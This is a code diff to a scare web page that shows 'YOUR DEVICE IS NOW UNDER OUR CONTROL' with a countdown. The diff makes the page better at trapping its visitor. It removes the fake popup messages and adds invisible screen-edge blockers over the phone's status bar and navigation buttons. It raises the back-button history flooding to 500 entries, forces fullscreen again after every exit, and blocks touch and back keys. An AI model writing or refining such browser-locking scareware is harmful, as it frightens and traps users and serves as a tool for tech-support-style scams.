@@ -15,10 +15,10 @@ p { font-size:1.6rem; max-width:90%; line-height:1.8; }
 @keyframes glitch { 0%{text-shadow:3px 3px #0ff,-3px -3px #f0f;} 50%{text-shadow:-3px -3px #0ff,3px 3px #f0f;} 100%{text-shadow:3px 3px #0ff,-3px -3px #f0f;} }
 .matrix { position:absolute; top:0; left:0; right:0; bottom:0; opacity:0.15; background:repeating-linear-gradient(0deg,#0f0,#0f0 1px,transparent 1px,transparent 2px); animation:rain 8s linear infinite; pointer-events:none; z-index:1; }
 @keyframes rain { 0%{transform:translateY(-100%);} 100%{transform:translateY(100%);} }
-.fake-popup { position:fixed; left:0; right:0; background:rgba(200,0,0,0.95); color:#fff; font-size:2.5rem; text-align:center; padding:40px; z-index:9999; pointer-events:auto; display:none; animation:flash 1.2s; }
-@keyframes flash { 0%{opacity:0; transform:scale(0.8);} 50%{opacity:1; transform:scale(1.1);} 100%{opacity:0; transform:scale(1);} }
-.bottom-popup { bottom:0; height:300px; }
-.top-popup { top:0; height:300px; }
+
+/* Strong blockers for top (status/quick settings) and bottom (navigation buttons) */
+#topBlocker { position:fixed; top:0; left:0; right:0; height:250px; background:transparent; z-index:9999; pointer-events:auto; display:none; }
+#bottomBlocker { position:fixed; bottom:0; left:0; right:0; height:250px; background:transparent; z-index:9999; pointer-events:auto; display:none; }
 </style>
 </head>
 <body>
@@ -33,21 +33,17 @@ p { font-size:1.6rem; max-width:90%; line-height:1.8; }
 <p style="color:#f00; font-size:2.2rem; margin-top:50px;">YOUR DEVICE IS NOW UNDER OUR CONTROL</p>
 </div>
 
-<script>
-const scaryMessages = ["ACCESS DENIED", "NO ESCAPE", "HACKER ACTIVE", "SYSTEM LOCKED", "CAMERA WATCHING", "PAY NOW", "FILES GONE", "INTRUDER ALERT", "BACKDOOR OPEN", "TRAPPED FOREVER"];
-for(let i = 0; i < 10; i++) {
-  let msg = scaryMessages[i % scaryMessages.length];
-  document.write(`<div class="fake-popup bottom-popup" onclick="this.style.display='none'">${msg}</div>`);
-  document.write(`<div class="fake-popup top-popup" onclick="this.style.display='none'">${msg}</div>`);
-}
-</script>
+<!-- Blockers -->
+<div id="topBlocker"></div>
+<div id="bottomBlocker"></div>
 
 <script>
 let time = 20;
 const start = document.getElementById('start');
 const overlay = document.getElementById('overlay');
 const countdown = document.getElementById('countdown');
-const popups = document.querySelectorAll('.fake-popup');
+const topBlocker = document.getElementById('topBlocker');
+const bottomBlocker = document.getElementById('bottomBlocker');
 
 document.body.addEventListener('touchstart', startLockdown, {once: true});
 document.body.addEventListener('click', startLockdown, {once: true});
@@ -57,33 +53,34 @@ async function startLockdown(e) {
   start.style.display = 'none';
   overlay.style.display = 'flex';
 
-  popups.forEach(p => p.style.display = 'block');
+  topBlocker.style.display = 'block';
+  bottomBlocker.style.display = 'block';
 
   if (document.documentElement.requestFullscreen) {
     await document.documentElement.requestFullscreen({ navigationUI: "hide" });
   }
 
-  // Max touch block
+  // Max touch freeze
   document.addEventListener('touchstart', e => e.preventDefault(), { passive: false });
   document.addEventListener('touchmove', e => e.preventDefault(), { passive: false });
   document.addEventListener('touchend', e => e.preventDefault(), { passive: false });
 
-  // Deep back arrow block - click many times = still full screen
-  for(let i = 0; i < 100; i++) { // 100 deep stack
+  // ULTRA back block
+  for(let i = 0; i < 500; i++) {
     history.pushState(null, null, location.href);
   }
   window.onpopstate = () => {
-    history.pushState(null, null, location.href); // Loop forever
-    requestFullScreen(); // Re-enter fullscreen if exited
+    history.pushState(null, null, location.href);
+    requestFullScreen();
   };
   window.addEventListener('keydown', e => {
     if (e.key === 'Backspace' || e.key === 'ArrowLeft' || e.key === 'Escape') {
       e.preventDefault();
-      requestFullScreen(); // Re-fullscreen on back keys
+      requestFullScreen();
     }
   });
 
-  // Re-fullscreen if exited
+  // Re-enter fullscreen if exited
   document.addEventListener('fullscreenchange', () => {
     if (!document.fullscreenElement) {
       requestFullScreen();
@@ -92,7 +89,7 @@ async function startLockdown(e) {
 
   function requestFullScreen() {
     if (document.documentElement.requestFullscreen) {
-      document.documentElement.requestFullscreen({ navigationUI: "hide" });
+      document.documentElement.requestFullscreen({ navigationUI: "hide" }).catch(() => {});
     }
   }
 
@@ -108,7 +105,8 @@ async function startLockdown(e) {
 }
 
 function endLockdown() {
-  popups.forEach(p => p.style.display = 'none');
+  topBlocker.style.display = 'none';
+  bottomBlocker.style.display = 'none';
   if (document.exitFullscreen) document.exitFullscreen();
 }
 
